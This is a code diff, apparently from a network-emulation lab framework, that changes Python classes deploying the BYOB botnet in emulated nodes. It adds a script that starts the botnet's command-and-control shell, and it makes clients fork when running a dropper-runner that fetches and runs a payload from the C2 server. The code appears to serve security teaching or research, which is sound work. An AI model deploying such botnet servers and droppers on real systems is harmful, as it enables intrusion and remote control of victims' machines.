@@ -42,6 +42,12 @@ echo -e 'exit\\ny' | python3 server.py --port $2
 python3 client.py --name 'client' $1 $2
 '''
 
+BotnetServerFileTemplates['start-byob-shell'] = '''\
+#!/bin/bash
+cd /tmp/byob/byob
+python3 server.py --port {}
+'''
+
 BotnetServerFileTemplates['server_patch'] = '''\
 diff --git a/byob/core/util.py b/byob/core/util.py
 index eca72d4..96160c6 100644
@@ -138,6 +144,10 @@ class BotnetServer(Server):
         # start the server & make dropper/stager/payload
         node.appendStartCommand('/server_init_script "{}" "{}"'.format(address, self.__port))
 
+        # script to start byob shell on correct port
+        node.setFile('/start-byob-shell', BotnetServerFileTemplates['start-byob-shell'].format(self.__port))
+        node.appendStartCommand('chmod +x /start-byob-shell')
+         
     def print(self, indent: int) -> str:
         out = ' ' * indent
         out += 'BotnetServer'
@@ -213,16 +223,19 @@ class BotnetClientServer(Server):
         node.addBuildCommand('curl https://raw.githubusercontent.com/malwaredllc/byob/master/byob/requirements.txt > /tmp/byob-requirements.txt')
         node.addBuildCommand('pip3 install -r /tmp/byob-requirements.txt')
 
+        fork = False
+
         # script to get dropper from server.
         if self.__dga == None:
             node.setFile('/client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner'])
         else:
+            fork = True
             node.setFile('/dga', self.__dga)
             node.setFile('/client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner_dga'])
 
         # get and run dropper from server.
         node.appendStartCommand('chmod +x /client_dropper_runner')
-        node.appendStartCommand('/client_dropper_runner "{}" "{}"'.format(self.__server, self.__port))
+        node.appendStartCommand('/client_dropper_runner "{}" "{}"'.format(self.__server, self.__port), fork)
 
     def print(self, indent: int) -> str:
         out = ' ' * indent
